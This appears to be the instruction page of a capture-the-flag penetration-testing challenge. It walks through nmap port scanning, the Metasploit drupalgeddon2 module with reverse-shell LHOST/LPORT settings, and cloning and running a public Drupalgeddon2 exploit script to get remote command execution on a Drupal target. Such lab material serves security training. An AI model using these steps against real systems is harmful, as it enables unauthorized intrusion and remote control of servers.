Use nmap to scan for open ports of the provided host, identify applications running on each port, use Metaploit or a exploit script you find online to take advantage of the first vulnerability.

#### Getting setup
Here are instructions on how to get your pen-tester environment setup:

#### Instructions for Completing the Challenge
- Run nmap
- Run metasploit or a different exploit script to take advantage of a vulnerability in the first identified app
- Execute commands remotely
- Find the flag program in the current directory and use it to sign the challenge salt: `./flag <SALT>`

##### Nmap
Install nmap.

For Debian/Ubuntu:

`apt-get install nmap`
 
For RedHat/CentOS:

`rpm -vhU https://nmap.org/dist/nmap-7.80-1.x86_64.rpm`

Once nmap is installed you can scan the target host with `nmap <target_host> -Pn -p-`

Other useful parameters are listed below:

* `-p` {PORT_NUMBERS}: Scan ports of the target. It can be a single port number or
a range of ports.
* `-PS`, `-PA`, `-PU` {PORT_NUMBERS}: Replace it with the ports to scan. TCP SYN/ACK or 
UDP discovery.
* `-sV`: Determine service and version info.
* `-O`: Determine OS info. 
* `-A`: Determine service/version and OS info.
* `-script` {SCRIPT_NAME}: Start the scan with the given script.
* `--script` {SCRIPT_LIST}: Start the scan with the given scripts.

For a detailed list of all parameters availible please refer to the [Nmap Reference Guide](https://nmap.org/book/man.html).

##### Metasploit
If you have Docker installed you can simply run the metasploit container image. Here's how to do it:

Pull metasploit docker image from DockerHub

`docker pull metasploitframework/metasploit-framework`

Run metasploit container, forward port 4444 (needed for reverse shell), make sure those ports are open in security groups etc in your metasploit machine

`docker run -it -p 4444-4450:4444-4450 metasploitframework/metasploit-framework`

Search for the exploit you'd like to use based on nmap results, in this challenge look for Drupal exploits

`search drupal`

Select the Drupalgeddon2 exploit from the list

`use exploit/unix/webapp/drupal_drupalgeddon2`

Set the host and port for the attacker's and victim's machine

`set RHOSTS <host>`
`set RPORT <port>`
`set LHOST <remote IP of Metasploit machine>`
`set LPORT 4444`

Run the exploit!

`run`

This may fail in some cases, if it fails once reset the LHOST and run again

`set LHOST <remote IP of Metasploit machine>`
`run`

You should be able to get shell at this point and run commands in the container. Can you get the flag? Good luck!

If you want to learn more about Metasploit, please check out this free course from Offensive Security: [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)

##### Exploit Script

Before being ported to Metasploit for easy usage, exploits are usually released in the wild, in an ad-hoc way. Hackers can also take advantage of those to carry out their attacks. 

If the Metasploit option didn't work or you'd like to try another way of exploiting the same vulnerability, here it is:

In this scenario we are going to use the public exploit available here: https://github.com/dreadlocked/Drupalgeddon2

First, you need to clone the repository into your attacker's machine:

`git clone https://github.com/dreadlocked/Drupalgeddon2`

Go to the project folder and install the library dependencies:

`cd Drupalgeddon2`

`sudo gem install highline`

You should be able to excute the exploit like so:

`./drupalgeddon2.rb {VICTIM_IP_OR_URL:VICTIM_PORT}`

